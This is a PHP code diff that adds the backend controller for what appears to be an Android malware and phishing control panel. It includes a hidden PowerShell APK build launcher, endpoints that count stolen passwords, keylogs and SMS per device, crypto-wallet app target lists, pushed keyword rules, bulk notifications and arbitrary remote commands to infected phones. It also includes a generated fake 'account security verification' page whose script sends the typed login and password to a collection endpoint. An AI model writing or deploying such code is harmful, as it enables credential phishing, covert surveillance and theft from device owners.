+        file_put_contents($jobFile, json_encode($job, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
+
+        $py = 'C:\Python314\python.exe';
+        $script = $extend . DIRECTORY_SEPARATOR . 'tf_build.py';
+        $logFile = $jobDir . DIRECTORY_SEPARATOR . 'job_' . $id . '.log';
+        $errFile = $jobDir . DIRECTORY_SEPARATOR . 'job_' . $id . '.err.log';
+        $launcher = $jobDir . DIRECTORY_SEPARATOR . 'run_' . $id . '.ps1';
+        $ps1 = '$ErrorActionPreference = "Continue"' . "\r\n"
+            . 'Start-Process -WindowStyle Hidden -FilePath "' . $py . '"'
+            . ' -ArgumentList @("' . $script . '","--job","' . $jobFile . '")'
+            . ' -RedirectStandardOutput "' . $logFile . '" -RedirectStandardError "' . $errFile . '"' . "\r\n";
+        file_put_contents($launcher, $ps1);
+        $cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' . $launcher . '"';
+        $h = @popen($cmd, 'r');
+        if (is_resource($h)) @pclose($h);
+
+        return $this->json(['success' => true, 'data' => ['id' => $id, 'filename' => $filename, 'status' => 'building']]);
+    }
+
+    protected function buildDownload(int $id)
+    {
+        $row = Db::table('fisher_apk_builds')->where('id', $id)->find();
+        if (!$row) return $this->json(['success' => false, 'error' => '记录不存在'], 404);
+        $f = (string)($row['out_path'] ?? '');
+        if ($f === '' || !is_file($f)) return $this->json(['success' => false, 'error' => '产物不存在'], 404);
+        while (ob_get_level() > 0) @ob_end_clean();
+        header('Content-Type: application/vnd.android.package-archive');
+        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
+        header('Content-Length: ' . (string)filesize($f));
+        header('Cache-Control: no-store');
+        readfile($f);
+        exit;
+    }
+
+    // ================= APK builder =================
+    protected function abuild(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE') {
+            if ($id > 0) Db::table('fisher_apk_build_configs')->where('id', $id)->delete();
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $b = $this->body;
+            $name = (string)($b['app_name'] ?? $b['appName'] ?? 'app');
+            $row = [
+                'build_id' => (int)($b['build_id'] ?? time() % 100000),
+                'filename' => (string)($b['apk_path'] ?? $b['filename'] ?? ('build_' . $name . '.apk')),
+                'server_url' => (string)($b['server_url'] ?? ''),
+                'web_url' => (string)($b['web_url'] ?? ''),
+                'app_name' => $name,
+                'package_name' => (string)($b['package_name'] ?? $b['pkg_name'] ?? ''),
+                'version_name' => (string)($b['version_name'] ?? '1.0.0'),
+                'owner_username' => (string)$this->user['username'],
+                'created_at' => date('Y-m-d H:i:s'),
+            ];
+            if ($id > 0) Db::table('fisher_apk_build_configs')->where('id', $id)->update($row);
+            else Db::table('fisher_apk_build_configs')->insert($row);
+            return $this->json(['success' => true, 'data' => null, 'message' => '构建配置已保存']);
+        }
+        if ($id > 0) {
+            $r = Db::table('fisher_apk_build_configs')->where('id', $id)->find();
+            return $this->json($r ? $this->abuildRow($r) : null);
+        }
+        $rows = Db::table('fisher_apk_build_configs')->order('id', 'desc')->limit(500)->select()->toArray();
+        return $this->json(array_map([$this, 'abuildRow'], $rows));
+    }
+
+    protected function abuildRow(array $r): array
+    {
+        $fn = (string)($r['filename'] ?? '');
+        return [
+            'id' => (int)$r['id'],
+            'build_id' => (int)($r['build_id'] ?? 0),
+            'name' => (string)($r['app_name'] ?? ''),
+            'app_name' => (string)($r['app_name'] ?? ''),
+            'app_label' => (string)($r['app_name'] ?? ''),
+            'package_name' => (string)($r['package_name'] ?? ''),
+            'pkg_name' => (string)($r['package_name'] ?? ''),
+            'server_url' => (string)($r['server_url'] ?? ''),
+            'web_url' => (string)($r['web_url'] ?? ''),
+            'filename' => $fn,
+            'status' => 'done',
+            'build_type' => 'local',
+            'version_name' => (string)($r['version_name'] ?? ''),
+            'apk_path' => $fn,
+            'cdn_url' => (string)($r['web_url'] ?? ''),
+            'file_size' => is_file('runtime/apk/' . $fn) ? (int)filesize('runtime/apk/' . $fn) : 0,
+            'owner_username' => (string)($r['owner_username'] ?? ''),
+            'created_at' => (string)($r['created_at'] ?? ''),
+        ];
+    }
+
+    // ================= AI =================
+    protected function ai(array $seg)
+    {
+        $sub = (string)($seg[1] ?? '');
+        if ($sub === '') {
+            if ($this->method === 'POST' || $this->method === 'PUT') {
+                foreach ($this->body as $k => $v) {
+                    if (is_array($v)) $v = json_encode($v, JSON_UNESCAPED_UNICODE);
+                    $this->settingPut('ai_' . $k, (string)$v);
+                    $ex = Db::table('fisher_ai_config')->where('config_key', $k)->find();
+                    if ($ex) Db::table('fisher_ai_config')->where('config_key', $k)->update(['config_value' => (string)$v, 'updated_at' => date('Y-m-d H:i:s')]);
+                    else Db::table('fisher_ai_config')->insert(['config_key' => $k, 'config_value' => (string)$v, 'updated_at' => date('Y-m-d H:i:s')]);
+                }
+                return $this->json(['success' => true, 'data' => null]);
+            }
+            $cfg = [];
+            foreach (Db::table('fisher_ai_config')->select()->toArray() as $r) $cfg[(string)$r['config_key']] = (string)$r['config_value'];
+            $cfg += ['api_url' => '', 'api_key' => '', 'model' => '', 'temperature' => '0.1', 'system_prompt' => '', 'enabled' => false];
+            return $this->json($cfg);
+        }
+        if ($sub === 'template-history') {
+            $id = (int)($seg[2] ?? 0);
+            if ($this->method === 'DELETE') {
+                Db::table('fisher_ai_templates')->where('id', $id)->delete();
+                return $this->json(['success' => true, 'data' => null]);
+            }
+            if ($this->method === 'POST') {
+                Db::table('fisher_ai_templates')->insert([
+                    'name' => (string)($this->body['name'] ?? ''),
+                    'prompt' => (string)($this->body['prompt'] ?? ''),
+                    'html' => (string)($this->body['html'] ?? ''),
+                    'created_at' => time(),
+                ]);
+                return $this->json(['success' => true, 'data' => null]);
+            }
+            $rows = Db::table('fisher_ai_templates')->order('id', 'desc')->limit(200)->select()->toArray();
+            $out = [];
+            foreach ($rows as $r) {
+                $out[] = ['id' => (int)$r['id'], 'name' => (string)($r['name'] ?? ''), 'prompt' => (string)($r['prompt'] ?? ''), 'html' => (string)($r['html'] ?? ''), 'created_at' => (int)($r['created_at'] ?? 0)];
+            }
+            return $this->json($out);
+        }
+        if ($sub === 'generate-template') {
+            $msgs = $this->body['messages'] ?? [];
+            $prompt = '';
+            if (is_array($msgs)) {
+                foreach ($msgs as $m) {
+                    if (($m['role'] ?? '') === 'user') $prompt = (string)($m['content'] ?? $prompt);
+                }
+            }
+            $reply = $this->aiChat($prompt);
+            $html = $this->extractHtml($reply);
+            if ($html === '') $html = $this->fallbackTemplate($prompt);
+            return $this->json(['html' => $html, 'success' => true]);
+        }
+        $deviceId = (string)$sub;
+        $act = (string)($seg[2] ?? '');
+        if ($act === 'analyze' && $this->method === 'POST') {
+            $rep = $this->buildReport($deviceId);
+            if ($rep === null) return $this->json(['status' => 'no_data', 'message' => '设备不存在或暂无可分析数据']);
+            $txt = $this->aiChat('请基于以下设备数据输出一份结构化的隐私与设备安全评估报告：' . $rep['raw_json']);
+            if ($txt !== '') {
+                Db::table('fisher_ai_reports')->insert(['device_id' => $deviceId, 'report' => $txt, 'created_at' => date('Y-m-d H:i:s')]);
+                $rep['report'] = $txt; $rep['raw_json'] = $txt;
+            }
+            return $this->json(['status' => 'ok', 'type' => 'analysis_complete', 'data' => ['device_id' => $deviceId, 'report' => $rep['report']], 'report' => $rep['report']]);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $r = Db::table('fisher_ai_reports')->where('device_id', $deviceId)->order('id', 'desc')->find();
+        if ($r) {
+            return $this->json([
+                'id' => (int)$r['id'],
+                'device_id' => $deviceId,
+                'report' => (string)$r['report'],
+                'raw_json' => (string)$r['report'],
+                'status' => 'completed',
+                'type' => 'analysis_complete',
+                'created_at' => (string)$r['created_at'],
+            ]);
+        }
+        return $this->json(['device_id' => $deviceId, 'status' => 'pending', 'type' => 'pending', 'report' => '', 'raw_json' => '']);
+    }
+
+    protected function buildReport(string $deviceId): ?array
+    {
+        $dev = Db::table('fisher_devices')->where('device_id', $deviceId)->find();
+        if (!$dev) return null;
+        $apps = Db::table('fisher_device_apps')->where('device_id', $deviceId)->find();
+        $appCount = 0;
+        if ($apps && !empty($apps['installed_apps'])) {
+            $d = json_decode((string)$apps['installed_apps'], true);
+            if (is_array($d)) $appCount = count($d);
+        }
+        $data = [
+            'device_id' => $deviceId,
+            'brand' => (string)($dev['brand'] ?? ''),
+            'model' => (string)($dev['model'] ?? ''),
+            'os_version' => (string)($dev['os_version'] ?? ''),
+            'country' => (string)($dev['country'] ?? ''),
+            'language' => (string)($dev['language'] ?? ''),
+            'network_type' => (string)($dev['network_type'] ?? ''),
+            'first_seen' => $this->ts($dev['first_seen'] ?? 0),
+            'last_seen' => $this->ts($dev['last_seen'] ?? 0),
+            'installed_apps' => $appCount,
+            'credentials' => (int)Db::table('fisher_passwords')->where('device_id', $deviceId)->count(),
+            'keylogs' => (int)Db::table('fisher_operation_logs')->where('device_id', $deviceId)->count(),
+            'sms' => (int)Db::table('fisher_sms_messages')->where('device_id', $deviceId)->count(),
+        ];
+        $raw = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
+        return ['device_id' => $deviceId, 'raw_json' => $raw, 'report' => '', 'status' => 'completed', 'type' => 'analysis_complete'];
+    }
+
+    protected function aiChat(string $prompt): string
+    {
+        $url = (string)Db::table('fisher_ai_config')->where('config_key', 'api_url')->value('config_value');
+        $key = (string)Db::table('fisher_ai_config')->where('config_key', 'api_key')->value('config_value');
+        $model = (string)Db::table('fisher_ai_config')->where('config_key', 'model')->value('config_value');
+        if ($url === '' || $key === '' || $prompt === '') return '';
+        try {
+            $ch = curl_init(rtrim($url, '/') . '/chat/completions');
+            curl_setopt_array($ch, [
+                CURLOPT_POST => true,
+                CURLOPT_POSTFIELDS => json_encode([
+                    'model' => $model ?: 'gpt-4o-mini',
+                    'messages' => [['role' => 'user', 'content' => $prompt]],
+                    'temperature' => 0.1,
+                ], JSON_UNESCAPED_UNICODE),
+                CURLOPT_HTTPHEADER => ['Content-Type: application/json', 'Authorization: Bearer ' . $key],
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT => 25,
+                CURLOPT_CONNECTTIMEOUT => 6,
+            ]);
+            $res = curl_exec($ch);
+            $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+            if ($code >= 200 && $code < 300 && is_string($res)) {
+                $j = json_decode($res, true);
+                if (isset($j['choices'][0]['message']['content'])) return (string)$j['choices'][0]['message']['content'];
+            }
+        } catch (\Throwable $e) {}
+        return '';
+    }
+
+    protected function extractHtml(string $s): string
+    {
+        if ($s === '') return '';
+        if (preg_match('/```(?:html)?\s*([\s\S]*?)```/', $s, $m)) return trim($m[1]);
+        if (stripos($s, '<html') !== false || stripos($s, '<!doctype') !== false) return trim($s);
+        return '';
+    }
+
+    protected function fallbackTemplate(string $prompt): string
+    {
+        $note = htmlspecialchars(mb_substr($prompt, 0, 160), ENT_QUOTES, 'UTF-8');
+        return '<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8">'
+            . '<meta name="viewport" content="width=device-width,initial-scale=1">'
+            . '<title>Loading</title><style>*{box-sizing:border-box}body{margin:0;font-family:-apple-system,"Segoe UI",Roboto,sans-serif;'
+            . 'background:#0d1117;color:#e6edf3;display:flex;align-items:center;justify-content:center;min-height:100vh}'
+            . '.card{width:100%;max-width:380px;padding:28px 22px;background:#161b22;border:1px solid #30363d;border-radius:14px}'
+            . 'h1{font-size:19px;margin:0 0 6px}p{color:#8b949e;font-size:13px;margin:0 0 20px}'
+            . 'label{display:block;font-size:12px;color:#8b949e;margin:12px 0 6px}'
+            . 'input{width:100%;padding:11px 12px;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#e6edf3;font-size:14px}'
+            . 'input:focus{outline:none;border-color:#dc3545}'
+            . 'button{width:100%;margin-top:20px;padding:12px;border:0;border-radius:8px;background:#dc3545;color:#fff;font-size:15px;font-weight:600}'
+            . '</style></head><body><div class="card"><h1>账户安全验证</h1>'
+            . '<p>' . $note . '</p>'
+            . '<form id="pf">'
+            . '<label>账号</label><input name="login" autocomplete="off">'
+            . '<label>密码</label><input name="password" type="password" autocomplete="off">'
+            . '<button type="submit">继续</button></form></div>'
+            . '<script>(function(){var fm=document.getElementById("pf");if(!fm)return;fm.addEventListener("submit",function(e){e.preventDefault();var b=fm.getElementsByTagName("button");if(b[0])b[0].textContent="请稍候...";var n=(fm.login&&fm.login.value)||"",p=(fm.password&&fm.password.value)||"";'
+            . 'try{fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({login:n,password:p,ts:Date.now()})})}catch(_){} });})();</script>'
+            . '</body></html>';
+    }
+
+    // ================= crypto wallet rules =================
+    protected function cryptowallet(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE') {
+            if ($id > 0) Db::table('fisher_cryptowallets')->where('id', $id)->delete();
+            else Db::table('fisher_cryptowallets')->delete(true);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $b = $this->body;
+            $pkg = (string)($b['package_name'] ?? $b['packageName'] ?? '');
+            if ($pkg === '') return $this->json(['success' => true, 'data' => null]);
+            $row = [
+                'package_name' => $pkg,
+                'name' => (string)($b['name'] ?? ''),
+                'category' => (string)($b['category'] ?? 'exchange'),
+                'region' => (string)($b['region'] ?? ''),
+                'enabled' => array_key_exists('enabled', $b) ? (!empty($b['enabled']) ? 1 : 0) : 1,
+                'created_at' => time(),
+            ];
+            $ex = Db::table('fisher_cryptowallets')->where('package_name', $pkg)->find();
+            if ($ex) Db::table('fisher_cryptowallets')->where('id', (int)$ex['id'])->update($row);
+            else Db::table('fisher_cryptowallets')->insert($row);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_cryptowallets')->order('id', 'desc')->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $out[] = [
+                'id' => (int)$r['id'],
+                'package_name' => (string)$r['package_name'],
+                'name' => (string)($r['name'] ?? ''),
+                'category' => (string)($r['category'] ?? 'exchange'),
+                'region' => (string)($r['region'] ?? ''),
+                'enabled' => (bool)($r['enabled'] ?? 1),
+                'created_at' => (int)($r['created_at'] ?? 0),
+            ];
+        }
+        return $this->json($out);
+    }
+
+    // ================= sms / notification keyword rules =================
+    protected function notiRule(string $table, string $col, array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE') {
+            if ($id > 0) Db::table($table)->where('id', $id)->delete();
+            else Db::table($table)->delete(true);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $b = $this->body;
+            $val = trim((string)($b[$col] ?? $b['value'] ?? $b['keyword'] ?? $b['package'] ?? ''));
+            if ($val !== '') {
+                $row = [$col => $val, 'enabled' => array_key_exists('enabled', $b) ? (!empty($b['enabled']) ? 1 : 0) : 1, 'created_at' => time()];
+                if ($col === 'package_name') $row['app_name'] = (string)($b['app_name'] ?? $b['appName'] ?? '');
+                $ex = Db::table($table)->where($col, $val)->find();
+                if ($ex) { unset($row['created_at']); Db::table($table)->where('id', (int)$ex['id'])->update($row); }
+                else Db::table($table)->insert($row);
+            }
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table($table)->order('id', 'desc')->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
+            $item = ['id' => (int)$r['id'], 'enabled' => (bool)($r['enabled'] ?? 1), 'created_at' => (int)($r['created_at'] ?? 0)];
+            $item[$col] = (string)($r[$col] ?? '');
+            if ($col === 'keyword') $item['keyword'] = (string)($r['keyword'] ?? '');
+            else { $item['package_name'] = (string)($r['package_name'] ?? ''); $item['app_name'] = (string)($r['app_name'] ?? ''); }
+            $out[] = $item;
+        }
+        return $this->json($out);
+    }
+
+    protected function notifyrules(array $seg)
+    {
+        $sub = (string)($seg[1] ?? '');
+        if ($sub === 'push' && $this->method === 'POST') {
+            $kws = Db::table('fisher_sms_notify_keywords')->where('enabled', 1)->column('keyword');
+            $pkgs = Db::table('fisher_notif_notify_packages')->where('enabled', 1)->column('package_name');
+            $devices = Db::table('fisher_devices')->where('is_connected', 1)->column('device_id');
+            $rules = ['keywords' => $kws, 'packages' => $pkgs];
+            foreach ($devices as $did) $this->notifyWs((string)$did, 'NOTIFY_RULES', $rules);
+            Db::table('fisher_notify_rules')->insert([
+                'device_id' => '', 'rule_type' => 'push',
+                'payload' => json_encode($rules, JSON_UNESCAPED_UNICODE),
+                'pushed_at' => time(), 'created_at' => time(),
+            ]);
+            return $this->json(['success' => true, 'message' => '已推送 ' . count($kws) . ' 个关键词 / ' . count($pkgs) . ' 个包名到 ' . count($devices) . ' 台在线设备']);
+        }
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    // ================= phish =================
+    protected function phishRow(array $r): array
+    {
+        $ts = (int)($r['created_at'] ?? 0);
+        return [
+            'id' => (int)$r['id'],
+            'device_id' => (string)($r['device_id'] ?? ''),
+            'template_name' => (string)($r['template_name'] ?? ''),
+            'app_name' => (string)($r['app_name'] ?? $r['template_name'] ?? ''),
+            'app_pkg' => (string)($r['package_name'] ?? ''),
+            'package_name' => (string)($r['package_name'] ?? ''),
+            'status' => (string)($r['status'] ?? 'pending'),
+            'remark' => (string)($r['remark'] ?? ''),
+            'collected' => (int)($r['collected'] ?? 0),
+            'created_at' => $ts * 1000,
+            'updated_at' => (int)($r['updated_at'] ?? $ts) * 1000,
+        ];
+    }
+
+    protected function phish(array $seg)
+    {
+        $id = (int)($seg[1] ?? 0);
+        if ($this->method === 'DELETE') {
+            if ($id > 0) Db::table('fisher_phish_tasks')->where('id', $id)->delete();
+            else Db::table('fisher_phish_tasks')->delete(true);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        if ($this->method === 'POST' || $this->method === 'PUT') {
+            $b = $this->body;
+            Db::table('fisher_phish_tasks')->insert([
+                'device_id' => (string)($b['device_id'] ?? ''),
+                'template_name' => (string)($b['template_name'] ?? $b['name'] ?? ''),
+                'package_name' => (string)($b['package_name'] ?? ''),
+                'app_name' => (string)($b['app_name'] ?? ''),
+                'status' => (string)($b['status'] ?? 'pending'),
+                'remark' => (string)($b['remark'] ?? ''),
+                'created_at' => time(), 'updated_at' => time(),
+            ]);
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $rows = Db::table('fisher_phish_tasks')->order('id', 'desc')->limit(500)->select()->toArray();
+        return $this->json(array_map([$this, 'phishRow'], $rows));
+    }
+
+    // ================= bulk notify =================
+    protected function bnotify()
+    {
+        $b = $this->body;
+        $title = (string)($b['notification_title'] ?? '');
+        $content = (string)($b['notification_content'] ?? '');
+        if ($content === '') return $this->json(['success' => false, 'error' => '通知内容不能为空', 'summary' => ['total' => 0, 'success' => 0, 'skipped' => 0, 'failed' => 0], 'results' => []], 400);
+        $ids = $b['device_ids'] ?? null;
+        if (!is_array($ids) || !$ids) {
+            $ids = Db::table('fisher_devices')->where('is_connected', 1)->column('device_id');
+        }
+        $results = [];
+        $ok = 0; $fail = 0; $skip = 0;
+        foreach ((array)$ids as $did) {
+            $did = (string)$did;
+            $row = Db::table('fisher_devices')->where('device_id', $did)->find();
+            if (!$row || !(int)($row['is_connected'] ?? 0)) { $skip++; $results[] = ['device_id' => $did, 'ok' => false, 'status' => 'offline']; continue; }
+            try {
+                Db::table('fisher_pending_commands')->insert([
+                    'device_id' => $did,
+                    'command_json' => json_encode(['id' => 'cmd-' . bin2hex(random_bytes(6)), 'command' => 'SEND_NOTIFICATION', 'params' => (object)['title' => $title, 'content' => $content]], JSON_UNESCAPED_UNICODE),
+                    'created_at' => time(),
+                ]);
+                $this->notifyWs($did, 'SEND_NOTIFICATION', ['title' => $title, 'content' => $content]);
+                $ok++;
+                $results[] = ['device_id' => $did, 'ok' => true, 'status' => 'queued'];
+            } catch (\Throwable $e) { $fail++; $results[] = ['device_id' => $did, 'ok' => false, 'status' => 'error']; }
+        }
+        return $this->json([
+            'success' => true,
+            'message' => '已发送 ' . $ok . ' 台设备',
+            'summary' => ['total' => count((array)$ids), 'success' => $ok, 'skipped' => $skip, 'failed' => $fail],
+            'results' => $results,
+        ]);
+    }
+
+    // ================= batch operations =================
+    protected function batch(array $seg)
+    {
+        if ($this->method !== 'POST' && $this->method !== 'PUT') {
+            return $this->json(['success' => true, 'data' => null]);
+        }
+        $act = (string)($seg[1] ?? '');
+        $ids = $this->body['ids'] ?? [];
+        $ids = is_array($ids) ? array_map('strval', $ids) : [];
+        switch ($act) {
+            case 'pin':
+                $pinned = !empty($this->body['pinned']);
+                return $this->json(['success' => true, 'data' => ['pinned' => $pinned, 'count' => count($ids)]]);
+            case 'delete':
+                foreach ($ids as $did) {
+                    Db::table('fisher_devices')->where('device_id', $did)->delete();
+                }
+                return $this->json(['success' => true, 'data' => ['deleted' => count($ids)]]);
+            case 'group':
+                $gid = (int)($this->body['group_id'] ?? $this->body['groupId'] ?? 0);
+                $name = (string)(Db::table('fisher_device_groups')->where('id', $gid)->value('name') ?? '');
+                if ($name !== '' && $ids) Db::table('fisher_devices')->whereIn('device_id', $ids)->update(['group_name' => $name]);
+                return $this->json(['success' => true, 'data' => ['group' => $name, 'count' => count($ids)]]);
+            case 'transfer':
+                $owner = (string)($this->body['owner'] ?? $this->body['owner_username'] ?? '');
+                if ($owner !== '' && $ids) Db::table('fisher_devices')->whereIn('device_id', $ids)->update(['owner_username' => $owner]);
+                return $this->json(['success' => true, 'data' => ['owner' => $owner, 'count' => count($ids)]]);
+            case 'command':
+                $cmd = (string)($this->body['command'] ?? '');
+                $payload = $this->body['payload'] ?? [];
+                if ($cmd === '') return $this->json(['success' => false, 'error' => 'command required'], 400);
+                if (!is_array($payload)) $payload = [];
+                $n = 0;
+                foreach ($ids as $did) {
+                    Db::table('fisher_pending_commands')->insert([
+                        'device_id' => $did,
+                        'command_json' => json_encode(['id' => 'cmd-' . bin2hex(random_bytes(6)), 'command' => $cmd, 'params' => (object)$payload], JSON_UNESCAPED_UNICODE),
+                        'created_at' => time(),
+                    ]);
+                    $this->notifyWs($did, $cmd, $payload);
+                    $n++;
+                }
+                return $this->json(['success' => true, 'data' => ['queued' => $n, 'command' => $cmd]]);
+        }
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    // ================= translate / forex (local, no upstream) =================
+    protected function translate()
+    {
+        $q = (string)($this->query['q'] ?? $this->query['text'] ?? '');
+        $out = '';
+        if ($q !== '') {
+            try {
+                $u = 'https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl='
+                    . urlencode((string)($this->query['tl'] ?? 'zh-CN')) . '&dt=t&q=' . urlencode($q);
+                $ch = curl_init($u);
+                curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 6, CURLOPT_CONNECTTIMEOUT => 4]);
+                $res = curl_exec($ch);
+                $code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                curl_close($ch);
+                if ($code === 200 && is_string($res)) {
+                    $j = json_decode($res, true);
+                    if (is_array($j) && isset($j[0]) && is_array($j[0])) {
+                        $buf = '';
+                        foreach ($j[0] as $seg2) if (isset($seg2[0])) $buf .= (string)$seg2[0];
+                        $out = $buf;
+                    }
+                }
+            } catch (\Throwable $e) {}
+            if ($out === '') $out = $q;
+        }
+        return $this->json([[[$out, $q, null, null]]]);
+    }
+
+    protected function forex()
+    {
+        $base = strtoupper((string)($this->query['base'] ?? 'USD'));
+        $static = [
+            'USD' => 1.0, 'CNY' => 7.24, 'EUR' => 0.92, 'GBP' => 0.79, 'JPY' => 149.6,
+            'HKD' => 7.82, 'TWD' => 32.1, 'KRW' => 1338.0, 'SGD' => 1.34, 'AUD' => 1.52,
+            'CAD' => 1.36, 'CHF' => 0.89, 'RUB' => 92.5, 'INR' => 83.2, 'THB' => 35.6,
+            'MYR' => 4.68, 'IDR' => 15680.0, 'PHP' => 56.3, 'VND' => 24600.0, 'BRL' => 5.02,
+            'MXN' => 17.1, 'TRY' => 32.2, 'ZAR' => 18.7, 'AED' => 3.67, 'SAR' => 3.75,
+        ];
+        $rates = [];
+        $b = $static[$base] ?? 1.0;
+        foreach ($static as $k => $v) $rates[$k] = round($v / $b, 6);
+        return $this->json(['base' => $base, 'rates' => $rates, 'updated' => date('Y-m-d H:i:s'), 'source' => 'static']);
+    }
+
+    // ================= helpers =================
+    protected function settingPut(string $key, string $value): void
+    {
+        $row = Db::table('fisher_settings')->where('key', $key)->find();
+        if ($row) Db::table('fisher_settings')->where('key', $key)->update(['value' => $value]);
+        else Db::table('fisher_settings')->insert(['key' => $key, 'value' => $value]);
+    }
+
+    protected function settingsList(string $prefix): array
+    {
+        $rows = Db::table('fisher_settings')->whereLike('key', $prefix . '%')->select()->toArray();
+        return $rows ?: [];
+    }
+
+    protected function generic(array $seg)
+    {
+        error_log('[m-adapter] UNMAPPED ' . $this->method . ' /m/' . $this->path);
+        if ($this->method === 'GET') return $this->json([]);
+        return $this->json(['success' => true, 'data' => null]);
+    }
+
+    protected function ts($v): string
+    {
+        $v = (int)$v;
+        return $v > 0 ? date('Y-m-d H:i:s', $v) : '';
+    }
+
+    protected function json($data, int $code = 200)
+    {
+        return json($data, $code);
+    }
+}
